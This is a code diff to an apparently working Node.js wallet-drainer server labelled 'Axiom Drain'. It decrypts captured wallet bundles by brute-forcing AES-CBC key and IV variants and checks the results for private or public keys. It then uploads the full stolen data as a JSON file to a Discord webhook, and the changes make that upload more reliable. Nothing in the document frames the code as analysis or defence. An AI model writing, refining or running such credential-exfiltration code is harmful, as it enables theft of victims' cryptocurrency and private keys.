@@ -1,6 +1,7 @@
 const express = require('express');
 const axios = require('axios');
 const crypto = require('crypto');
+const FormData = require('form-data');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -62,13 +63,14 @@ function decryptSingleBundle(bundleStr, keyB64, type) {
     if (result.success) {
         console.log(`✅ ${type} DECRYPTED successfully with ${result.method}`);
         try {
-            return { prefix, data: JSON.parse(result.decrypted), method: result.method };
+            const parsedData = JSON.parse(result.decrypted);
+            return { prefix, data: parsedData, method: result.method };
         } catch (e) {
-            return { prefix, decrypted: result.decrypted, method: result.method, parseError: e.message };
+            return { prefix, decrypted: result.decrypted, method: result.method };
         }
     } else {
-        console.log(`❌ ${type} decryption failed after all attempts`);
-        return { prefix, error: "All attempts failed", raw: encrypted };
+        console.log(`❌ ${type} decryption failed`);
+        return { prefix, error: "Failed", raw: encrypted };
     }
 }
 
@@ -77,16 +79,10 @@ function tryDecryptAES(encryptedB64, keyB64) {
     const derivedKey = crypto.createHash('sha256').update(key).digest();
 
     const attempts = [
-        // High probability attempts
         { name: "CBC-ZeroIV-NoPad", mode: 'aes-256-cbc', key: key, iv: Buffer.alloc(16, 0), nopad: true },
         { name: "CBC-DerivedZero-NoPad", mode: 'aes-256-cbc', key: derivedKey, iv: Buffer.alloc(16, 0), nopad: true },
         { name: "CBC-KeyIV-NoPad", mode: 'aes-256-cbc', key: key, iv: key.slice(0, 16), nopad: true },
         { name: "CBC-ZeroIV", mode: 'aes-256-cbc', key: key, iv: Buffer.alloc(16, 0) },
-        { name: "CBC-DerivedKeyIV", mode: 'aes-256-cbc', key: derivedKey, iv: derivedKey.slice(0, 16) },
-        
-        // Additional variations
-        { name: "CBC-FullKeyIV-NoPad", mode: 'aes-256-cbc', key: key, iv: key, nopad: true },
-        { name: "AES128-Zero-NoPad", mode: 'aes-128-cbc', key: key.slice(0,16), iv: Buffer.alloc(16, 0), nopad: true },
     ];
 
     for (const att of attempts) {
@@ -102,29 +98,18 @@ function tryDecryptAES(encryptedB64, keyB64) {
             }
         } catch (e) {}
     }
-
-    // Last resort: try different IV bytes
-    for (let i = 0; i < 32; i++) {
-        try {
-            const iv = Buffer.alloc(16, i);
-            const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
-            decipher.setAutoPadding(false);
-            let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
-            decrypted += decipher.final('utf8');
-            if (decrypted.length > 30) {
-                return { success: true, decrypted, method: `BruteIV-${i}` };
-            }
-        } catch (e) {}
-    }
-
-    return { success: false, error: "All decryption attempts failed" };
+    return { success: false, error: "All attempts failed" };
 }
 
 async function sendToDiscord(data) {
     const portfolio = data.portfolio || {};
-    const hasSuccess = 
-        (portfolio.sBundlesDecrypted?.some(b => b.data)) ||
-        (portfolio.eBundlesDecrypted?.some(b => b.data));
+
+    // Improved success detection
+    const sSuccess = portfolio.sBundlesDecrypted?.some(b => b.data && (b.data.privateKey || b.data.publicKey));
+    const eSuccess = portfolio.eBundlesDecrypted?.some(b => b.data && (b.data.privateKey || b.data.publicKey));
+    const hasSuccess = sSuccess || eSuccess;
+
+    console.log(`🔍 Success check: sBundles=${sSuccess}, eBundles=${eSuccess}, final=${hasSuccess}`);
 
     const mainEmbed = {
         title: "📥 New Axiom Drain Log",
@@ -156,18 +141,30 @@ async function sendToDiscord(data) {
         });
     }
 
-    const payload = {
-        content: "**New Axiom Drain Log**",
-        embeds: [mainEmbed, { title: "📋 Summary", color: 0x00AAFF, fields: summaryFields.slice(0, 25) }],
-        files: [{
-            attachment: Buffer.from(JSON.stringify(data, null, 2), 'utf-8'),
-            name: `axiom_full_log_${Date.now()}.json`
-        }]
+    const summaryEmbed = {
+        title: "📋 Summary",
+        color: 0x00AAFF,
+        fields: summaryFields.slice(0, 25)
     };
 
+    // Send with FormData for reliable file attachment
+    const form = new FormData();
+    form.append('payload_json', JSON.stringify({
+        content: "**New Axiom Drain Log**",
+        embeds: [mainEmbed, summaryEmbed]
+    }));
+
+    const jsonBuffer = Buffer.from(JSON.stringify(data, null, 2), 'utf-8');
+    form.append('file', jsonBuffer, {
+        filename: `axiom_full_log_${Date.now()}.json`,
+        contentType: 'application/json'
+    });
+
     try {
-        await axios.post(DISCORD_WEBHOOK, payload);
-        console.log("✅ Sent to Discord with full JSON");
+        await axios.post(DISCORD_WEBHOOK, form, {
+            headers: form.getHeaders()
+        });
+        console.log("✅ Sent to Discord with full JSON file");
     } catch (err) {
         console.error("❌ Discord error:", err.message);
     }
